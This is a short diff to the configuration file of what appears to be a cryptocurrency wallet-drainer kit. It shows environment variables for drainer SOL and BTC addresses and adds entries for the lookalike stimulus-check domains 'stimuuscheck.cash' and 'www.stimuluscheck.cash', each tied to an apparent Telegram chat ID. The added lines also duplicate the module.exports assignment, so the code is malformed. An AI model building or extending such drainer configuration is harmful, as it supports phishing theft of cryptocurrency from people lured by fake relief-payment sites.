@@ -3,6 +3,10 @@ const SOL = process.env.DRAINER_SOL_ADDRESS;
 const BTC = process.env.DRAINER_BTC_ADDRESS;
 
 module.exports = {
+  'stimuuscheck.cash': { label: 'MAIN', chatId: '8986598152', evm: '', sol: '', btc: '' },
+  'www.stimuluscheck.cash': { label: 'MAIN', chatId: '8986598152', evm: '', sol: '', btc: '' },
+};
+module.exports = {
   'yourdomain.com': {
     label: 'MAIN',
     shares: { YOU: 1 },
